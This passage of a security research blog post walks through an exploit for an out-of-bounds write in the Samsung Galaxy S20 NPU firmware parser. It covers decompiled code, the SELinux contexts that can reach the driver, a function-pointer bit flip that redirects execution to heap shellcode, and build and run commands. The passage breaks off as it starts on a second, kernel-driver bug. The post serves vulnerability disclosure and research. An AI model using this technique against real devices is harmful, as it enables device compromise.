    <span class="n">memcpy</span><span class="p">(</span><span class="n">ncp_header</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">header_size</span><span class="p">);</span>

    <span class="cm">/* NCP object setup ------------------------------------------------ */</span>
    <span class="cm">/* Addresses relative to ncp_header */</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_cpy</span><span class="p">.</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">ncp_header</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_cpy</span><span class="p">.</span><span class="n">address_vector</span> <span class="o">=</span> \
        <span class="n">ncp_header</span> <span class="o">+</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">address_vector_offset</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_cpy</span><span class="p">.</span><span class="n">memory_vector</span> <span class="o">=</span> \
        <span class="n">ncp_header</span> <span class="o">+</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">memory_vector_offset</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_cpy</span><span class="p">.</span><span class="n">io_vector</span> <span class="o">=</span> \
        <span class="n">ncp_header</span> <span class="o">+</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">io_vector_offset</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_cpy</span><span class="p">.</span><span class="n">group_vector</span> <span class="o">=</span> \
        <span class="n">ncp_header</span> <span class="o">+</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">group_vector_offset</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_cpy</span><span class="p">.</span><span class="n">chunks</span> <span class="o">=</span> <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">chunks</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_cpy</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">ncp_header</span> <span class="o">+</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">body_offset</span><span class="p">;</span>

    <span class="cm">/* Addresses relative to the payload */</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_src</span><span class="p">.</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">payload</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_src</span><span class="p">.</span><span class="n">address_vector</span> <span class="o">=</span> \
        <span class="n">payload</span> <span class="o">+</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">address_vector_offset</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_src</span><span class="p">.</span><span class="n">memory_vector</span> <span class="o">=</span> \
        <span class="n">payload</span> <span class="o">+</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">memory_vector_offset</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_src</span><span class="p">.</span><span class="n">io_vector</span> <span class="o">=</span> \
        <span class="n">payload</span> <span class="o">+</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">io_vector_offset</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_src</span><span class="p">.</span><span class="n">group_vector</span> <span class="o">=</span> \
        <span class="n">payload</span> <span class="o">+</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">group_vector_offset</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_src</span><span class="p">.</span><span class="n">chunks</span> <span class="o">=</span> <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">chunks</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">ncp_src</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">body_offset</span><span class="p">;</span>

    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">_unk_48</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">vector_cnt</span> <span class="o">=</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">group_vector_cnt</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">_unk_54</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">chunk_cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">header</span> <span class="o">=</span> <span class="n">ncp_header</span><span class="p">;</span>
    <span class="cm">/* ----------------------------------------------------------------- */</span>

    <span class="cm">/* [...] */</span>
</code></pre></div>

<p>As you can see, some addresses are computed using an offset provided 
in the payload. While some of those are verified in the kernel, others 
are left unchecked. In particular, the field <code>group_vector_offset</code>
 is used as an offset to retrieve an array of group vectors. A rough 
decompiled version of the code parsing the group vectors is given below.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">parser_init</span><span class="p">(</span><span class="k">struct</span> <span class="nc">ncp_object</span> <span class="o">*</span><span class="n">ncp_object</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">ncp_header</span> <span class="o">*</span><span class="n">payload</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>

    <span class="cm">/*</span>
<span class="cm">     * Computes the group_vector address using the user-controlled</span>
<span class="cm">     * value `group_vector_offset` from the ncp header.</span>
<span class="cm">     */</span>
    <span class="k">struct</span> <span class="nc">group_vector</span> <span class="o">*</span><span class="n">curr_group_vector</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">group_vector</span> <span class="o">*</span><span class="n">group_vectors</span> <span class="o">=</span> \
        <span class="n">ncp_header</span> <span class="o">+</span> <span class="n">ncp_header</span><span class="o">-&gt;</span><span class="n">group_vector_offset</span><span class="p">;</span>

    <span class="cm">/* [...] */</span>

    <span class="n">u32</span> <span class="n">vector_ctr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/* If there are vectors to parse... */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">vector_cnt</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/*</span>
<span class="cm">             * Retrieves the offset and size of the current group vector</span>
<span class="cm">             * at offsets 0x18 and 0x1c respectively.</span>
<span class="cm">             */</span>
            <span class="n">u32</span> <span class="n">intrinsic_offset</span> <span class="o">=</span> <span class="n">group_vectors</span><span class="o">-&gt;</span><span class="n">intrinsic_offset</span><span class="p">;</span>
            <span class="n">u32</span> <span class="n">intrinsic_size</span> <span class="o">=</span> <span class="n">group_vectors</span><span class="o">-&gt;</span><span class="n">intrinsic_size</span><span class="p">;</span>
            <span class="cm">/* The intrinsic offset must be 4-byte aligned */</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">intrinsic_offset</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span>
                <span class="k">return</span> <span class="mh">0x115</span><span class="p">;</span>

            <span class="k">struct</span> <span class="nc">ncp_chunk</span><span class="o">*</span> <span class="n">chunk</span> <span class="o">=</span> <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">chunks</span><span class="p">[</span><span class="n">chunk_id</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="mh">0x7800</span> <span class="o">-</span> <span class="n">chunk</span><span class="o">-&gt;</span><span class="n">_unk_08</span> <span class="o">&lt;</span> <span class="n">intrinsic_size</span><span class="p">)</span> <span class="p">{</span>
                <span class="cm">/* Marks the current group vector as processed */</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">curr_group_vector</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">curr_group_vector</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">|=</span> <span class="mi">8</span><span class="p">;</span>
                    <span class="cm">/* [...] */</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="cm">/* [...] */</span>

            <span class="cm">/* Moves on to the next group vector */</span>
            <span class="n">curr_group_vector</span> <span class="o">=</span> <span class="n">group_vectors</span><span class="p">;</span>
            <span class="n">group_vectors</span><span class="o">++</span><span class="p">;</span>
            <span class="n">vector_ctr</span><span class="o">++</span><span class="p">;</span>

            <span class="cm">/* If there is no more group vector to parse */</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">vector_ctr</span> <span class="o">&gt;=</span> <span class="n">ncp_object</span><span class="o">-&gt;</span><span class="n">vector_cnt</span><span class="p">)</span>
                <span class="k">goto</span> <span class="n">GROUP_VECTOR_SUCCESS</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="cm">/* [...] */</span>

<span class="nl">GROUP_VECTOR_SUCCESS</span><span class="p">:</span>
    <span class="cm">/* Marks the last group vector as processed */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">curr_group_vector</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">group_vector</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">|=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="cm">/* [...] */</span>
    <span class="p">}</span>
</code></pre></div>

<p>Once <code>parser_init</code> has looped over all group vectors successfully, the 4th bit of <code>group_vector-&gt;flags</code> will be set for each of them to signify that they are valid. However, since the address of all <code>group_vector</code> objects are relative to <code>ncp_header-&gt;group_vector_offset</code>,
 which is user-controlled, it is possible to set the 4th bit of 
arbitrary bytes in the address space of the NPU. The only limitation is 
that the value coinciding with <code>group_vectors-&gt;intrinsic_offset</code>
 must be 4-byte aligned. The next section explains how this primitive 
can be exploited to get arbitrary code execution in the NPU.</p>
<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">¶</a></h2>
<h3 id="selinux-context">SELinux Context<a class="headerlink" href="#selinux-context" title="Permanent link">¶</a></h3>
<p>Before we can start, we need to take a look at the SELinux context to
 list which components are able to communicate with the NPU.</p>
<p>The SELinux context of Samsung's NPU device driver <code>/dev/vertex10</code> used to be <code>untrusted_app</code>. However, as can be seen below, it was made more restrictive after <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2073">Project Zero</a>'s disclosure of vulnerabilities affecting this driver.</p>
<div class="codehilite"><pre><span></span><code><span class="gp">x1s:/dev # </span>ls -lZ /dev/vertex10
<span class="go">crw-r--r-- 1 system system u:object_r:vendor_npu_device:s0  82,  10 2021-03-16 12:16 /dev/vertex10</span>
</code></pre></div>

<p>This means that in order to communicate with it, we would need a first privilege escalation to get access to the <code>vendor_npu_device</code> SELinux context. On the firmware we analyzed, we can see that there are five contexts able to send ioctls to the NPU driver:</p>
<ul>
<li><code>hal_camera_default</code></li>
<li><code>hal_neuralnetworks_eden_drv_default</code></li>
<li><code>hal_vendor_eden_runtime_default</code></li>
<li><code>platform_app</code></li>
<li><code>snap_hidl</code></li>
</ul>
<div class="codehilite"><pre><span></span><code><span class="gp">lyte@debian:~/tmp$ </span>sesearch --allow s20_selinux_policy <span class="p">|</span> grep vendor_npu_device <span class="p">|</span> grep ioctl
<span class="go">allow hal_camera_default vendor_npu_device:chr_file { ioctl open read write };</span>
<span class="go">allow hal_neuralnetworks_eden_drv_default vendor_npu_device:chr_file { ioctl open read write };</span>
<span class="go">allow hal_vendor_eden_runtime_default vendor_npu_device:chr_file { ioctl open read write };</span>
<span class="go">allow platform_app vendor_npu_device:chr_file { ioctl open read };</span>
<span class="go">allow snap_hidl vendor_npu_device:chr_file { append getattr ioctl lock map open read watch watch_reads write };</span>
</code></pre></div>

<p>And as far as we can tell, this could be achieved by compromising one of the following processes:</p>
<div class="codehilite"><pre><span></span><code><span class="gp">x1s:/dev # </span>ps -ZA <span class="p">|</span> grep -e hal_camera_default -e hal_neuralnetworks_eden_drv_default -e hal_vendor_eden_runtime_default -e platform_app -e snap_hidl
<span class="go">u:r:hal_neuralnetworks_eden_drv_default:s0 system 6104  1 11310600 14172 binder_ioctl_write_read 0 S android.hardware.neuralnetworks@1.3-service.eden-drv</span>
<span class="go">u:r:hal_camera_default:s0      cameraserver   6125      1 10958168 11580 binder_ioctl_write_read 0 S vendor.samsung.hardware.camera.provider@4.0-service_64</span>
<span class="go">u:r:snap_hidl:s0               system         6132      1 10801344  3728 binder_ioctl_write_read 0 S vendor.samsung.hardware.snap@1.1-service</span>
<span class="go">u:r:hal_vendor_eden_runtime_default:s0 system 6179      1 11305928 14196 binder_ioctl_write_read 0 S vendor.samsung_slsi.hardware.eden_runtime@1.0-service</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a62         6982   6077 16114388 346668 ep_poll            0 S com.android.systemui</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a151        7532   6077 14853708 226100 ep_poll            0 S com.sec.android.app.launcher</span>
<span class="go">u:r:platform_app:s0:c512,c768  oem_5013       7777   6077 14127536 125892 ep_poll            0 S com.sec.location.nsflp2</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a124        8517   6077 14024140 107888 ep_poll            0 S com.samsung.android.smartsuggestions</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a213        9226   6077 14832340 147584 ep_poll            0 S com.samsung.android.app.spage</span>
<span class="go">u:r:platform_app:s0:c512,c768  vendor_cmhservice 10115 6077 15057436 135868 ep_poll          0 S com.samsung.cmh:CMH</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a73        11551   6077 14605848 141736 ep_poll            0 S com.samsung.android.app.cocktailbarservice</span>
<span class="go">u:r:platform_app:s0:c512,c768  vendor_bcmgr  13858   6077 14002784 107068 ep_poll            0 S com.samsung.android.beaconmanager</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a116       16417   6077 14578312 144200 ep_poll            0 S com.sec.android.app.camera</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a230       22542   6077 14119200 136896 ep_poll            0 S com.samsung.android.calendar</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a120       27008   6079 2022612 131968 ep_poll             0 S com.samsung.android.mobileservice</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a118       27056   6077 14688588 162236 ep_poll            0 S com.osp.app.signin</span>
<span class="go">u:r:platform_app:s0:c512,c768  vendor_cmhservice 28417 6077 14074464 127488 ep_poll          0 S com.samsung.storyservice</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a183       29598   6079 1993840 101000 ep_poll             0 S com.samsung.android.app.smartcapture:screenrecorder</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a132       29637   6077 14153028 140804 ep_poll            0 S com.samsung.knox.securefolder</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a62        29683   6077 14072516 139300 ep_poll            0 S com.samsung.android.app.routines:RoutineUIProcess</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a62        29701   6077 14577548 142168 ep_poll            0 S com.samsung.android.app.aodservice</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a116       29743   6077 14596868 145088 ep_poll            0 S com.sec.android.app.camera:QrTileService</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a140       29751   6077 14548660 120172 ep_poll            0 S com.sec.android.app.soundalive</span>
<span class="go">u:r:platform_app:s0:c512,c768  vendor_sharelive 29784 6077 14185152 140744 ep_poll           0 S com.samsung.android.app.sharelive</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a99        30118   6079 1461684 109072 ep_poll             0 S com.samsung.android.mdx</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a89        30155   6077 14116800 137956 ep_poll            0 S com.samsung.android.game.gos</span>
<span class="go">u:r:platform_app:s0:c512,c768  u0_a93        30174   6077 14857764 150664 ep_poll            0 S com.samsung.android.game.gamehome</span>
<span class="go">u:r:platform_app:s0:c512,c768  vendor_cmhservice 32195 6077 14684604 163392 ep_poll          0 S com.samsung.faceservice</span>
</code></pre></div>

<p>Getting access to one of these processes is not the goal of this 
article and we will assume that we're already running in a SELinux 
context allowed to send ioclts to <code>/dev/vertex10</code>.</p>
<h3 id="general-strategy">General Strategy<a class="headerlink" href="#general-strategy" title="Permanent link">¶</a></h3>
<p>Writing an exploit for this vulnerability was relatively 
straightforwad, partly because there are few security mitigations used 
in the NPU. As we can see in the table below, multiple writable sections
 are not marked as non-executable and, during the <a href="https://github.com/LongtermSecurityInc/samsung-npu/blob/main/reverse/0x00_init.c#L115">initialization of the NPU</a>, the <code>WXN</code> bit is not set in <code>SCTLR</code>.
 It means that if we are somehow able to inject a shellcode into one of 
the RWX section and redirect the execution flow to it, we could take 
control of the NPU.</p>
<div class="tablewrapper"><table>
<thead>
<tr>
<th>Type</th>
<th>Virtual Address</th>
<th>Physical Address</th>
<th>Size</th>
<th>PXN</th>
<th>XN</th>
<th>NS</th>
<th>AP</th>
<th>B</th>
<th>C</th>
<th>S</th>
</tr>
</thead>
<tbody>
<tr>
<td>Short Desc.</td>
<td>0x00000000</td>
<td>0x50000000</td>
<td>0x0001d000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Writes at PL0 generate Permission faults</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x0001d000</td>
<td>0x5001d000</td>
<td>0x00003000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Writes at PL0 generate Permission faults</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x00020000</td>
<td>0x50020000</td>
<td>0x0000c000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Writes at PL0 generate Permission faults</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x0002c000</td>
<td>0x5002c000</td>
<td>0x00004000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Writes at PL0 generate Permission faults</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x00030000</td>
<td>0x50030000</td>
<td>0x00001000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Writes at PL0 generate Permission faults</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x00031000</td>
<td>0x50031000</td>
<td>0x00002800</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Full access</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x00033800</td>
<td>0x50033800</td>
<td>0x00001000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Full access</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x00034800</td>
<td>0x50034800</td>
<td>0x00001000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Full access</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x00035800</td>
<td>0x50035800</td>
<td>0x00001000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Full access</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x00036800</td>
<td>0x50036800</td>
<td>0x00001000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Full access</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x00037800</td>
<td>0x50037800</td>
<td>0x00005000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Full access</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x0003c800</td>
<td>0x5003c800</td>
<td>0x0002b800</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Full access</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x00068000</td>
<td>0x50068000</td>
<td>0x00018000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Full access</td>
<td>N</td>
<td>N</td>
<td>N</td>
</tr>
<tr>
<td>Short Desc.</td>
<td>0x00080000</td>
<td>0x50080000</td>
<td>0x00060000</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Full access</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
</tbody>
</table>
</div><p>As you can imagine, we will be using our bit-setting primitive to alter the execution flow. The only questions that remains are:</p>
<ul>
<li>How can we inject a shellcode into one of the RWX sections?</li>
<li>Which value(s) should be altered to redirect the execution to our shellcode?</li>
</ul>
<p>The answer to the first question is relatively easy. In <code>parser_init</code>, the payload received by the NPU is copied into a buffer allocated using <code>malloc</code> and therefore residing on the heap, which spans the executable region <code>0x80000-0xe0000</code>. We can place our shellcode at the end of the payload and execute it from the version copied on the heap.</p>
<p>The solution we chose for the second issue was to modify one bit of a
 function pointer to make it point to our shellcode. Potential 
candidates for this step include the handlers defined in <code>init_ncp_handlers</code> which were highlighed at the beginning of this article.</p>
<p>All of these handlers are located in the first code section <code>0x0-0x1d000</code>.
 What's convenient here, is that setting the 4th bit in the 2nd byte of a
 dword will transform an address in the code section, like <code>0x14abc</code>, into <code>0x80000 | 0x14abc = 0x94abc</code>, which is now on the heap!</p>
<p>For our exploit, we picked the function pointer of <code>ncp_manager_purge</code> which initially pointed to <code>0x14C48</code> and changed it to <code>0x94C48</code>. Since the payload we send from the kernel can be arbitrarily long (at least long enough to control the area around <code>0x94C48</code>), afterwards we just need to insert our shellcode at the correct offset and call <code>ncp_manager_purge</code>
 from the kernel to make the NPU execute our arbitrary instructions. In 
the next section, we will list the relevant steps to write an exploit 
and make this possible.</p>
<h3 id="writing-an-exploit">Writing an Exploit<a class="headerlink" href="#writing-an-exploit" title="Permanent link">¶</a></h3>
<p>The exploit we developed for this vulnerability is available <a href="https://github.com/LongtermSecurityInc/samsung-npu/tree/main/exploit/exploit.c">here</a>. It first starts by allocating and mapping an ION buffer before opening the NPU driver <code>/dev/vertex10</code>.</p>
<p>It then loads the payload we want to execute from <code>"/data/local/tmp/payload.bin"</code>. In the <a href="https://github.com/LongtermSecurityInc/samsung-npu/tree/main/exploit/Makefile">Makefile</a> we provide, the payload is compiled from <a href="https://github.com/LongtermSecurityInc/samsung-npu/tree/main/exploit/basic_payload.c">this file</a> and will output a simple <code>"PATCHED_NPU: hello from the NPU!"</code> in <code>dmesg</code>.</p>
<p>The actual exploitation starts with the call to <code>exploit_parser_init_arb_write</code>, which is going to set <code>group_vector_offset</code> to the following out-of-bounds value: <code>NPU_SHUTDOWN_OFFSET + NPU_SHUTDOWN_BYTE_POS - NEXT_MALLOC_ADDR</code>.</p>
<ul>
<li><code>NPU_SHUTDOWN_OFFSET</code> is the offset of <code>ncp_manager_purge</code>'s function pointer.</li>
<li><code>NPU_SHUTDOWN_BYTE_POS</code> is the position of the second byte which also takes into account the offset induced by the <code>flags</code> field in the <code>group_vector</code> object.</li>
<li><code>NEXT_MALLOC_ADDR</code> is the address returned by malloc when it allocates a chunk for the <code>ncp_header</code> copy in <code>parser_init</code>.
 This value was determined by simply patching the NPU and reading it 
dynamically (which is possible because there is no signature 
verification for this binary).</li>
</ul>
<p>This will place the <code>flags</code> field of our <code>group_vector</code> object over our targeted byte to change the underlying address from <code>0x14C48</code> to <code>0x94C48</code>. <code>exploit_parser_init_arb_write</code> also calls <code>init_ncp_header</code>
 which copies the custom payload in the ION buffer that will be sent to 
the kernel and, ultimately, to the NPU. The rest of the values set in 
the header are mostly irrelevant and won't be explicited in this 
article.</p>
<p>At this stage, all that remains is to send the data to the NPU. This is achieved by first using the ioctl <code>VS4L_VERTEXIOC_S_GRAPH</code> and then <code>VS4L_VERTEXIOC_S_FORMAT</code>. In the exploit, this logic is implemented in the function <code>do_graph_format_ioctl</code>. <code>VS4L_VERTEXIOC_S_FORMAT</code> will trigger a call to <code>npu_session_NW_CMD_LOAD</code>, which executes <code>ncp_manager_load</code> in the NPU and thus our vulnerable function <code>parser_init</code> that uses our out-of-bounds <code>group_vector_offset</code>. Once this ioctl returns, the NPU will have modified the function pointer of its <code>ncp_manager_purge</code> handler. All that is left to do is to call it.</p>
<p>Although, before we can proceed, we will have to meet a few requirements. <code>COMMAND_PURGE</code> is sent to the NPU when performing a <a href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/main/drivers/vision/npu/core/interface/hardware/npu-interface.c#L427"><code>STREAMOFF</code></a> operation. But to call <code>VS4L_VERTEXIOC_STREAM_OFF</code>, we first need to call <code>VS4L_VERTEXIOC_STREAM_ON</code>, and being able to call <code>VS4L_VERTEXIOC_STREAM_ON</code> requires the driver's <code>inqueue</code> and <code>outqueue</code> to be properly configured. </p>
<p>The operations needed to configure these queues are implemented in the functions <code>setup_in_queue</code> and <code>setup_out_queue</code>. They simply send valid requests that specify the directions <code>VS4L_DIRECTION_IN</code> and <code>VS4L_DIRECTION_OUT</code>.</p>
<p>We can now call <code>trigger</code> to make a <code>VS4L_VERTEXIOC_STREAM_ON</code> ioctl followed by a <code>VS4L_VERTEXIOC_STREAM_OFF</code>. If everything went as expected, these calls should succeed and the message <code>"PATCHED_NPU: hello from the NPU!"</code> should appear in <code>dmesg</code>.</p>
<p>If you have an unpatched Samsung Galaxy S20, you can try the exploit 
by first compiling it using the Android NDK and the Makefile provided.</p>
<div class="codehilite"><pre><span></span><code>$ make build
/opt/android-ndk/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android29-clang <span class="se">\</span>
    -Tsymbols.ld -fPIC --target<span class="o">=</span>arm-none-eabi -march<span class="o">=</span>armv7a -nostdlib <span class="se">\</span>
    -fpie -ffreestanding -ffunction-sections  -fomit-frame-pointer -o <span class="se">\</span>
    payload.bin payload.c
/opt/android-ndk/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android-objcopy <span class="se">\</span>
    -O binary --strip-all payload.bin
/opt/android-ndk/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android29-clang <span class="se">\</span>
    -o parser_init parser_init.c
</code></pre></div>

<p>You can then push it on a device and run it.</p>
<div class="codehilite"><pre><span></span><code>$ make push
// <span class="o">[</span>...<span class="o">]</span>

$ make run
// <span class="o">[</span>...<span class="o">]</span>
adb wait-for-device shell <span class="se">\</span>
        su root sh -c <span class="s2">"/data/local/tmp/parser_init /data/local/tmp/"</span>
<span class="o">[</span>+<span class="o">]</span> Opening /dev/ion
<span class="o">[</span>+<span class="o">]</span> ION allocation
<span class="o">[</span>+<span class="o">]</span> ION buffer mapping
<span class="o">[</span>+<span class="o">]</span> Opening /dev/vertex10
<span class="o">[</span>+<span class="o">]</span> Loading the payload
</code></pre></div>

<p>The following message should appear in <code>dmesg -w</code>:</p>
<div class="codehilite"><pre><span></span><code>x1s:/ <span class="c1"># dmesg -w | grep "PATCHED_NPU"</span>
<span class="o">[</span> <span class="m">5454</span>.496319<span class="o">]</span> <span class="o">[</span>__LOW<span class="o">][</span><span class="m">0005449</span>.475<span class="o">]</span>PATCHED_NPU: hello from the NPU!
</code></pre></div>

<p>We finally have code execution in the NPU! Now we can have a look at 
the second vulnerability we identified, which can be leveraged to attack
 the kernel from the NPU.</p>
<h1 id="buffer-overflow-in-samsung-npu-driver">Buffer Overflow in Samsung NPU Driver<a class="headerlink" href="#buffer-overflow-in-samsung-npu-driver" title="Permanent link">¶</a></h1>
<h2 id="npu-mailboxes">NPU Mailboxes<a class="headerlink" href="#npu-mailboxes" title="Permanent link">¶</a></h2>
<p>In this section, we will give a quick recap on how these mailboxes work. If you want more details, you can head over to the <a href="https://blog.impalabs.com/2103_reversing-samsung-npu.html#handling-commands-in-the-npu">first part</a>
 of this series. As we have said before, the NPU and the kernel exchange
 data using a system of mailboxes implemented over shared memory. There 
are four mailboxes organized according to the format given below:</p>
<p><a href="https://blog.impalabs.com/rsc/2110_exploiting-samsung-npu/mailbox_layout.png"><img alt="mailbox layout" src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/mailbox_layout.png"></a></p>
<p>A header is used to keep track of the different read/write pointers into the ring buffers. It is defined using the structure <code>struct mailbox_hdr</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="k">struct</span> <span class="nc">mailbox_hdr</span> <span class="p">{</span>
    <span class="n">u32</span> <span class="n">max_slot</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">debug_time</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">debug_code</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">log_level</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">log_dram</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">reserved</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
    <span class="k">struct</span> <span class="nc">mailbox_ctrl</span> <span class="n">h2fctrl</span><span class="p">[</span><span class="n">MAILBOX_H2FCTRL_MAX</span><span class="p">];</span>
    <span class="k">struct</span> <span class="nc">mailbox_ctrl</span> <span class="n">f2hctrl</span><span class="p">[</span><span class="n">MAILBOX_F2HCTRL_MAX</span><span class="p">];</span>
    <span class="n">u32</span> <span class="n">totsize</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">version</span><span class="p">;</span>
